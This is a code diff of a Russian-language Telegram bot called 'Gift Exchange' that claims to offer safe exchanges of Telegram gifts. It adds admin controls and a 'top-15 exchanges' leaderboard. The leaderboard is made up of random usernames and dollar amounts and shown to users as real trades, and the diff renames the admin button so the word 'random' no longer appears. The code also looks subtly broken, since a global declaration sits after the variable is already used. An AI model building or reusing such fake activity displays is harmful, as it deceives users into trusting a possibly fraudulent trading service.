@@ -1,5 +1,5 @@
 # NFT Exchange Bot для iPhone
-# ФИНАЛЬНАЯ ВЕРСИЯ - маленькие кнопки, исправленные тексты
+# ФИНАЛЬНАЯ ВЕРСИЯ - с баннером и топ-15
 
 import requests
 import time
@@ -19,12 +19,14 @@ deals = {}
 top_deals = []
 users = {}
 banned_users = set()
+last_message_ids = {}  # Для отслеживания последних сообщений
 settings = {
     "min_amount": 100,
-    "max_amount": 300
+    "max_amount": 300,
+    "banner_text": "👋 Приветствуем в проекте «Gift Exchange».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
 }
 
-# ===== КЛАВИАТУРЫ (МАЛЕНЬКИЕ КНОПКИ) =====
+# ===== КЛАВИАТУРЫ =====
 def main_keyboard():
     return {
         "keyboard": [
@@ -40,14 +42,26 @@ def admin_keyboard():
         "inline_keyboard": [
             [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
             [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
+            [{"text": "🚫 Бан пользователя", "callback_data": "admin_ban"}],
+            [{"text": "✅ Разбан", "callback_data": "admin_unban"}],
+            [{"text": "📝 Изменить баннер", "callback_data": "admin_banner"}],
+            [{"text": "💰 Изменить лимиты", "callback_data": "admin_limits"}],
             [{"text": "📋 Все сделки", "callback_data": "admin_deals"}],
-            [{"text": "🎲 Топ-15 (рандом)", "callback_data": "admin_random_top"}],
+            [{"text": "🎲 Обновить топ-15", "callback_data": "admin_refresh_top"}],
             [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
         ]
     }
 
-# ===== ОТПРАВКА СООБЩЕНИЙ =====
+# ===== ОТПРАВКА СООБЩЕНИЙ (с защитой от дублей) =====
 def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
+    # Проверяем, не отправляли ли такое же сообщение недавно
+    last_key = f"{chat_id}_{text[:50]}"
+    current_time = time.time()
+    
+    if last_key in last_message_ids:
+        if current_time - last_message_ids[last_key] < 2:  # 2 секунды
+            return  # Пропускаем дубль
+    
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     data = {
         "chat_id": chat_id,
@@ -57,11 +71,25 @@ def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
     if keyboard:
         data["reply_markup"] = keyboard
     try:
-        requests.post(url, json=data)
+        response = requests.post(url, json=data)
+        if response.status_code == 200:
+            last_message_ids[last_key] = current_time
+        # Очищаем старые записи
+        if len(last_message_ids) > 100:
+            old_keys = [k for k, t in last_message_ids.items() if current_time - t > 60]
+            for k in old_keys:
+                del last_message_ids[k]
     except:
         pass
 
 def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
+    last_key = f"inline_{chat_id}_{text[:50]}"
+    current_time = time.time()
+    
+    if last_key in last_message_ids:
+        if current_time - last_message_ids[last_key] < 2:
+            return
+    
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     keyboard = {"inline_keyboard": buttons}
     data = {
@@ -71,7 +99,9 @@ def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
         "parse_mode": parse_mode
     }
     try:
-        requests.post(url, json=data)
+        response = requests.post(url, json=data)
+        if response.status_code == 200:
+            last_message_ids[last_key] = current_time
     except:
         pass
 
@@ -90,28 +120,30 @@ def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
     except:
         pass
 
-# ===== ГЕНЕРАЦИЯ ТОП-15 С РАНДОМНЫМИ ЮЗЕРАМИ =====
-def generate_random_top():
+# ===== ГЕНЕРАЦИЯ ТОП-15 =====
+def generate_top_15():
     global top_deals
-    random_top = []
-    first_names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack", 
-                   "Kevin", "Laura", "Mike", "Nancy", "Oliver", "Paul", "Quinn", "Rose", "Sam", "Tina"]
-    
-    for i in range(15):
-        amount = random.randint(100, 400)
-        user1 = f"user{random.randint(1000, 9999)}"
-        user2 = f"user{random.randint(1000, 9999)}"
-        random_top.append({
-            'user1': f"@{user1}",
-            'user2': f"@{user2}",
-            'amount': amount,
-            'date': datetime.now().strftime("%Y-%m-%d")
-        })
-    
-    # Сортируем по убыванию
-    random_top.sort(key=lambda x: x['amount'], reverse=True)
-    top_deals = random_top
-    return random_top
+    if not top_deals:
+        # Генерируем рандомный топ
+        random_top = []
+        names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack", 
+                 "Kevin", "Laura", "Mike", "Nancy", "Oliver", "Paul", "Quinn", "Rose", "Sam", "Tina",
+                 "Victor", "Wendy", "Xavier", "Yvonne", "Zack"]
+        
+        for i in range(15):
+            amount = random.randint(100, 400)
+            user1 = random.choice(names) + str(random.randint(10, 99))
+            user2 = random.choice(names) + str(random.randint(10, 99))
+            random_top.append({
+                'user1': f"@{user1}",
+                'user2': f"@{user2}",
+                'amount': amount,
+                'date': datetime.now().strftime("%Y-%m-%d")
+            })
+        
+        random_top.sort(key=lambda x: x['amount'], reverse=True)
+        top_deals = random_top
+    return top_deals
 
 # ===== ОБРАБОТКА СООБЩЕНИЙ =====
 def handle_message(message):
@@ -135,14 +167,7 @@ def handle_message(message):
         }
     
     if text == '/start':
-        welcome_text = """
-<b>👋 Приветствуем в проекте «Gift Exchange».</b>
-
-<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>
-
-👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
-        """
-        send_message(chat_id, welcome_text, main_keyboard())
+        send_message(chat_id, settings['banner_text'], main_keyboard())
     
     elif text == "ℹ️ Информация":
         info_text = """
@@ -202,12 +227,9 @@ def handle_message(message):
         send_message(chat_id, support_text, main_keyboard())
     
     elif text == "🏆 Топ-15 обменов":
-        if not top_deals:
-            # Генерируем рандомный топ-15 при первом запросе
-            top_deals = generate_random_top()
-        
+        top_list = generate_top_15()
         top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
-        for i, deal in enumerate(top_deals[:15], 1):
+        for i, deal in enumerate(top_list[:15], 1):
             top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
         send_message(chat_id, top_text)
     
@@ -282,6 +304,7 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
             
             send_inline_keyboard(chat_id, deal_text, buttons)
             
+            # Уведомление второму участнику
             for uid, user_data in users.items():
                 if user_data.get('username') == second_user:
                     notify_text = f"""
@@ -341,13 +364,17 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
 
 <b>📊 Сделок:</b> {len(deals)}
 <b>👥 Пользователей:</b> {len(users)}
+<b>🚫 Забанено:</b> {len(banned_users)}
 <b>💰 Лимиты:</b> ${settings['min_amount']}-${settings['max_amount']}
+<b>🏆 В топ-15:</b> {len(top_deals)}
         """
         send_inline_keyboard(chat_id, admin_text, admin_keyboard()['inline_keyboard'])
     
+    # ===== АДМИН: РАССЫЛКА =====
     elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_broadcast':
         users[user_id]['state'] = None
         sent = 0
+        failed = 0
         for uid, user_data in users.items():
             if uid != ADMIN_ID:
                 try:
@@ -355,8 +382,68 @@ https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                     sent += 1
                     time.sleep(0.05)
                 except:
-                    pass
-        send_message(chat_id, f"<b>✅ Отправлено: {sent}</b>")
+                    failed += 1
+        send_message(chat_id, f"<b>✅ Отправлено: {sent}\n❌ Не доставлено: {failed}</b>")
+    
+    # ===== АДМИН: БАН =====
+    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_ban':
+        try:
+            target = text.replace('@', '').strip()
+            banned = False
+            for uid, user_data in users.items():
+                if user_data.get('username') == target or str(uid) == target:
+                    banned_users.add(uid)
+                    banned = True
+                    send_message(chat_id, f"<b>✅ Пользователь @{target} забанен</b>")
+                    break
+            if not banned:
+                send_message(chat_id, "<b>❌ Пользователь не найден</b>")
+            users[user_id]['state'] = None
+        except:
+            send_message(chat_id, "<b>❌ Ошибка</b>")
+            users[user_id]['state'] = None
+    
+    # ===== АДМИН: РАЗБАН =====
+    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_unban':
+        try:
+            target = text.replace('@', '').strip()
+            unbanned = False
+            for uid, user_data in list(users.items()):
+                if user_data.get('username') == target or str(uid) == target:
+                    if uid in banned_users:
+                        banned_users.remove(uid)
+                        unbanned = True
+                        send_message(chat_id, f"<b>✅ Пользователь @{target} разбанен</b>")
+                        break
+            if not unbanned:
+                send_message(chat_id, "<b>❌ Пользователь не найден или не забанен</b>")
+            users[user_id]['state'] = None
+        except:
+            send_message(chat_id, "<b>❌ Ошибка</b>")
+            users[user_id]['state'] = None
+    
+    # ===== АДМИН: БАННЕР =====
+    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_banner':
+        settings['banner_text'] = text
+        users[user_id]['state'] = None
+        send_message(chat_id, "<b>✅ Баннер обновлен!</b>")
+    
+    # ===== АДМИН: ЛИМИТЫ =====
+    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_limits':
+        try:
+            parts = text.replace('$', '').replace(' ', '').split('-')
+            if len(parts) == 2:
+                min_val = int(parts[0])
+                max_val = int(parts[1])
+                settings['min_amount'] = min_val
+                settings['max_amount'] = max_val
+                send_message(chat_id, f"<b>✅ Лимиты обновлены: ${min_val}-${max_val}</b>")
+            else:
+                send_message(chat_id, "<b>❌ Используйте формат: мин-макс (например 100-300)</b>")
+            users[user_id]['state'] = None
+        except:
+            send_message(chat_id, "<b>❌ Ошибка формата. Используйте: мин-макс</b>")
+            users[user_id]['state'] = None
 
 # ===== ОБРАБОТКА КНОПОК =====
 def handle_callback(callback):
@@ -391,18 +478,17 @@ def handle_callback(callback):
         deal['participant_name'] = username
         deal['status'] = 'in_progress'
         
-        # Добавляем в реальный топ только если сделка состоялась
-        if settings['min_amount'] <= deal['amount'] <= settings['max_amount']:
-            top_deals.append({
-                'user1': f"@{deal['creator_name']}",
-                'user2': f"@{username}",
-                'amount': deal['amount'],
-                'date': datetime.now().strftime("%Y-%m-%d")
-            })
-            # Сортируем и оставляем только 15
-            sorted_top = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
-            top_deals.clear()
-            top_deals.extend(sorted_top)
+        # Добавляем в топ
+        top_deals.append({
+            'user1': f"@{deal['creator_name']}",
+            'user2': f"@{username}",
+            'amount': deal['amount'],
+            'date': datetime.now().strftime("%Y-%m-%d")
+        })
+        # Сортируем и оставляем 15
+        sorted_top = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
+        top_deals.clear()
+        top_deals.extend(sorted_top)
         
         send_message(
             deal['creator_id'],
@@ -425,14 +511,7 @@ def handle_callback(callback):
             edit_message(chat_id, message_id, f"<b>❌ СДЕЛКА #{deal_id} ОТМЕНЕНА</b>")
     
     elif data == "main_menu":
-        welcome_text = """
-<b>👋 Приветствуем в проекте «Gift Exchange».</b>
-
-<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>
-
-👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
-        """
-        send_message(chat_id, welcome_text, main_keyboard())
+        send_message(chat_id, settings['banner_text'], main_keyboard())
     
     elif data == "how_deal":
         deal_text = """
@@ -456,12 +535,17 @@ def handle_callback(callback):
         """
         send_message(chat_id, deal_text)
     
+    # ===== АДМИН КНОПКИ =====
     elif data == "admin_stats" and user_id == ADMIN_ID:
         stats_text = f"""
 <b>📊 СТАТИСТИКА</b>
 
 <b>📌 Всего сделок:</b> {len(deals)}
+<b>✅ Завершено:</b> {len([d for d in deals.values() if d['status'] == 'completed'])}
+<b>🔄 Активных:</b> {len([d for d in deals.values() if d['status'] == 'in_progress'])}
+<b>⏳ Ожидают:</b> {len([d for d in deals.values() if d['status'] == 'waiting'])}
 <b>👥 Пользователей:</b> {len(users)}
+<b>🚫 Забанено:</b> {len(banned_users)}
 <b>🏆 В топ-15:</b> {len(top_deals)}
         """
         edit_message(chat_id, message_id, stats_text, admin_keyboard())
@@ -470,34 +554,48 @@ def handle_callback(callback):
         users[user_id]['state'] = 'admin_broadcast'
         edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:</b>")
     
+    elif data == "admin_ban" and user_id == ADMIN_ID:
+        users[user_id]['state'] = 'admin_ban'
+        edit_message(chat_id, message_id, "<b>🚫 Введите @username или ID пользователя для бана:</b>")
+    
+    elif data == "admin_unban" and user_id == ADMIN_ID:
+        users[user_id]['state'] = 'admin_unban'
+        edit_message(chat_id, message_id, "<b>✅ Введите @username или ID пользователя для разбана:</b>")
+    
+    elif data == "admin_banner" and user_id == ADMIN_ID:
+        users[user_id]['state'] = 'admin_banner'
+        edit_message(chat_id, message_id, f"<b>📝 Введите новый текст баннера:\n\nТекущий:\n{settings['banner_text']}</b>")
+    
+    elif data == "admin_limits" and user_id == ADMIN_ID:
+        users[user_id]['state'] = 'admin_limits'
+        edit_message(chat_id, message_id, f"<b>💰 Введите новые лимиты в формате: мин-макс\nТекущие: ${settings['min_amount']}-${settings['max_amount']}</b>")
+    
     elif data == "admin_deals" and user_id == ADMIN_ID:
         if not deals:
             edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_keyboard())
             return
         
-        deals_text = "<b>📋 СДЕЛКИ:</b>\n\n"
+        deals_text = "<b>📋 ВСЕ СДЕЛКИ:</b>\n\n"
         for deal_id, deal in list(deals.items())[:10]:
             status_emoji = "⏳" if deal['status'] == 'waiting' else "🔄" if deal['status'] == 'in_progress' else "✅"
             deals_text += f"{status_emoji} <b>{deal_id}</b>: @{deal['creator_name']} ↔ @{deal['second_user']} (${deal['amount']})\n"
         
+        if len(deals) > 10:
+            deals_text += f"\n<b>...и еще {len(deals) - 10} сделок</b>"
+        
         edit_message(chat_id, message_id, deals_text, admin_keyboard())
     
-    elif data == "admin_random_top" and user_id == ADMIN_ID:
-        random_top = generate_random_top()
-        top_text = "<b>🎲 СГЕНЕРИРОВАН ТОП-15 (РАНДОМ):</b>\n\n"
-        for i, deal in enumerate(random_top[:15], 1):
+    elif data == "admin_refresh_top" and user_id == ADMIN_ID:
+        global top_deals
+        top_deals = []  # Очищаем
+        new_top = generate_top_15()
+        top_text = "<b>🔄 ТОП-15 ОБНОВЛЕН:</b>\n\n"
+        for i, deal in enumerate(new_top[:15], 1):
             top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
         edit_message(chat_id, message_id, top_text, admin_keyboard())
     
     elif data == "admin_close" and user_id == ADMIN_ID:
-        welcome_text = """
-<b>👋 Приветствуем в проекте «Gift Exchange».</b>
-
-<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>
-
-👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
-        """
-        send_message(chat_id, welcome_text, main_keyboard())
+        send_message(chat_id, settings['banner_text'], main_keyboard())
 
 # ===== ЗАПУСК =====
 def main():
@@ -505,8 +603,8 @@ def main():
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"👑 Админ ID: {ADMIN_ID}")
     
-    # Генерируем рандомный топ-15 при старте
-    generate_random_top()
+    # Генерируем топ-15 при старте
+    generate_top_15()
     print(f"🏆 Сгенерирован топ-15 с {len(top_deals)} записями")
     
     offset = 0
